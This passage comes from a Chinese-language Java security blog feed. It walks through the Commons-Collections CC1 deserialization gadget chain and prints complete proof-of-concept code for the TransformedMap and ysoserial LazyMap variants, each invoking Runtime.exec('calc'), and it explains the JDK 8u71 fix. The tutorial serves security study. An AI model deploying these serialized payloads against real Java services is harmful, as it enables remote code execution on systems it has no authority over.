class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);  <span class="hljs-comment">//è¿™é‡Œçš„typeå°±æ˜¯æˆ‘ä»¬åˆšåˆšä¼ å…¥çš„Override.class</span><br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();     <span class="hljs-comment">//è·å–æˆå‘˜æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è·å–Overrideçš„æˆå‘˜æ–¹æ³•</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="hljs-comment">//æŸ¥æ‰¾æˆå‘˜æ–¹æ³•</span><br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//ä½†æ˜¯Overrideå¹¶æ²¡æœ‰å€¼ï¼Œæ‰€ä»¥æ ¹æœ¬èµ°ä¸åˆ°ä¸‹é¢çš„åˆ¤æ–­ï¼Œä¹Ÿå°±è°ƒç”¨ä¸äº†setValue()</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ”¹å†™è‡ªå·±çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">//è¿™æ®µçš„ä»£ç å¯ä»¥é€šè¿‡ChainedTransformeré“¾å¼è°ƒç”¨æ”¹å†™ã€‚</span><br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//keyæ”¹ä¸ºTargetçš„æˆå‘˜æ–¹æ³•</span><br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è¿™é‡Œæ”¹ä¸ºTarget.class</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³é—®é¢˜ä¸‰ï¼š</p><p><code>ConstantTransformer.transform</code>ç›¸å½“äºä¼ å…¥ä»€ä¹ˆå°±è¿”å›ä»€ä¹ˆï¼Œè¿™å°±å¾ˆæ–¹ä¾¿æˆ‘ä»¬äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥(Runtime.class)</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523194708176.png" alt="image-20240523194708176"></p><h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );<br><br>        SER(o);<br><span class="hljs-comment">//        UNSER(&quot;ser.bin&quot;);</span><br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ysoserialç‰ˆæœ¬CC1"><a href="#ysoserialç‰ˆæœ¬CC1" class="headerlink" title="ysoserialç‰ˆæœ¬CC1"></a>ysoserialç‰ˆæœ¬CC1</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202238209.png" alt="image-20240523202238209"></p><p>å…¶å®è¿™åé¢è¿™éƒ¨åˆ†å’ŒTransformMapç‰ˆæœ¬æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬å½“æ—¶æƒ³è°ƒç”¨<code>TransformMap.transform()</code>æ–¹æ³•ï¼ŒTransformMapç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯<code>TransformMap.checkSetValue()</code>ã€‚ysoserialç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯<code>LazyMap.get()</code>ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523202537062.png" alt="image-20240523202537062"></p><p> factoryæ­£å¥½ä¼ å…¥æˆ‘ä»¬ä¹‹å‰çš„<code>ChainedTransformer</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210551073.png" alt="image-20240523210551073"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523210636955.png" alt="image-20240523210636955"></p><p>LazyMapçš„æ„æ€æ˜¯ä¸€å¼€å§‹ä¸å†™keyï¼Œç­‰è°ƒç”¨çš„æ—¶å€™é€šè¿‡transform()è°ƒç”¨keyï¼Œæ‰€ä»¥ä¸€å¼€å§‹è¦ç¡®ä¿æ²¡æœ‰key;</p><p>æ¥ä¸‹æ¥å°±æ‰¾è°è°ƒç”¨äº†get(),æ‰¾åˆ°äº†<code>AnnotationInvocationHandler.invoke()</code>ï¼Œè€ŒåŠ¨æ€ä»£ç†ç±»ä¼šè‡ªåŠ¨æ‰§è¡Œinvokeæ–¹æ³•ï¼Œè¿‡è¿™é‡Œçš„åˆ¤æ–­å¾ˆç®€å•ï¼Œåªéœ€è¦ä¸è°ƒç”¨equlsæ–¹æ³•å’Œä¸è°ƒç”¨æœ‰å‚æ–¹æ³•å°±èƒ½è¿‡è¿™ä¸¤ä¸ªifã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523211936873.png" alt="image-20240523211936873"></p><p><code>AnnotationInvocationHandler</code>ä»åå­—æ¥çœ‹å°±æ˜¯åŠ¨æ€å¤„ç†å™¨ç±»åˆæ­£å¥½<code>AnnotationInvocationHandler.readObject</code> è°ƒç”¨äº†<code>entrySet()</code>æ­£å¥½æ’åœ¨æªå£ä¸Šã€‚menberValuesåˆå¯æ§ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523212053262.png" alt="image-20240523212053262"></p><h3 id="å®Œæ•´ä»£ç -1"><a href="#å®Œæ•´ä»£ç -1" class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span>(InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Target.class, lazyMap );<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, mapProxy);<br><br><br><span class="hljs-comment">//        SER(o);</span><br>        UNSER(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SER</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UNSER</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h2><p><img src="https://image.sp4rks.xyz/2024/06/image-20240523205520055.png" alt="image-20240523205520055"></p><h2 id="åç»­å®˜æ–¹ä¿®å¤æ–¹å¼"><a href="#åç»­å®˜æ–¹ä¿®å¤æ–¹å¼" class="headerlink" title="åç»­å®˜æ–¹ä¿®å¤æ–¹å¼"></a>åç»­å®˜æ–¹ä¿®å¤æ–¹å¼</h2><h3 id="å¯¹äºTransformMapç‰ˆ"><a href="#å¯¹äºTransformMapç‰ˆ" class="headerlink" title="å¯¹äºTransformMapç‰ˆ"></a>å¯¹äºTransformMapç‰ˆ</h3><p>JDK 8u71 åŠä»¥åçš„ç‰ˆæœ¬æ²¡æœ‰äº†èƒ½è°ƒç”¨ ReadObject ä¸­ <code>setValue()</code> æ–¹æ³•çš„åœ°æ–¹ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20110816.png" alt="2024-05-24 110816"></p><h3 id="å¯¹äºysoserialç‰ˆ"><a href="#å¯¹äºysoserialç‰ˆ" class="headerlink" title="å¯¹äºysoserialç‰ˆ"></a>å¯¹äºysoserialç‰ˆ</h3><p>å› ä¸ºåœ¨8u71ä¹‹åçš„ç‰ˆæœ¬ååºåˆ—åŒ–ä¸å†é€šè¿‡<code>defaultReadObject</code>æ–¹å¼ï¼Œè€Œæ˜¯é€šè¿‡<code>readFields</code> æ¥è·å–å‡ ä¸ªç‰¹å®šçš„å±æ€§ï¼Œ<code>defaultReadObject</code> å¯ä»¥æ¢å¤å¯¹è±¡æœ¬èº«çš„ç±»å±æ€§ï¼Œæ¯”å¦‚<code>this.memberValues</code> å°±èƒ½æ¢å¤æˆæˆ‘ä»¬åŸæœ¬è®¾ç½®çš„æ¶æ„ç±»ï¼Œä½†é€šè¿‡<code>readFields</code>æ–¹å¼ï¼Œ<code>this.memberValues</code> å°±ä¸ºnullï¼Œæ‰€ä»¥åç»­æ‰§è¡Œget()å°±å¿…ç„¶æ²¡å‘è§¦å‘ï¼Œè¿™ä¹Ÿå°±æ˜¯é«˜ç‰ˆæœ¬ä¸èƒ½ä½¿ç”¨çš„åŸå› ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240524111729060.png" alt="image-20240524111729060"></p><p><img src="https://image.sp4rks.xyz/2024/06/2024-05-24%20111150.png" alt="2024-05-24 111150"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons CollectionsåŒ…å’Œç®€ä»‹</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP</a></p><p><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡01-CC1é“¾</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVAååºåˆ—åŒ–</title>
    <link href="/2024/05/21/JAVA%E5%AE%89%E5%85%A8/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–"><a href="#ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–" class="headerlink" title="ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–"></a>ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–</h2><p><strong>1. æ•°æ®æŒä¹…åŒ–</strong></p><p>åºåˆ—åŒ–å¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ°æ–‡ä»¶ä¸­æˆ–æ•°æ®åº“ä¸­ï¼Œè¯¥å­—èŠ‚åŒ…å«å¯¹è±¡çš„æ•°æ®ã€å¯¹è±¡çš„ç±»å‹ã€å¯¹è±¡çš„å­˜å‚¨å±æ€§ã€‚è¿™ä½¿å¾— Java ç¨‹åºå¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿å­˜å’ŒåŠ è½½æ•°æ®ï¼Œè€Œæ— éœ€æ¯æ¬¡éƒ½é‡æ–°åˆ›å»ºå¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª Java åº”ç”¨ç¨‹åºå¯ä»¥å°†ç”¨æˆ·æ•°æ®åºåˆ—åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿åœ¨ä¸‹æ¬¡å¯åŠ¨æ—¶åŠ è½½ã€‚</p><p><strong>2. è¿œç¨‹é€šä¿¡</strong></p><p>åºåˆ—åŒ–è¿˜å¯ä»¥ç”¨äºåœ¨ç½‘ç»œä¸Šä¼ è¾“ Java å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª Java åº”ç”¨ç¨‹åºå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–å¹¶å‘é€ç»™å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œæˆ–è€…å°†ä¸€ä¸ªå¯¹è±¡ä»å®¢æˆ·ç«¯å‘é€åˆ°æœåŠ¡å™¨ã€‚è¿™ä½¿å¾— Java ç¨‹åºå¯ä»¥å¾ˆå®¹æ˜“åœ°åœ¨ä¸åŒçš„æœºå™¨ä¹‹é—´å…±äº«æ•°æ®ã€‚</p><h2 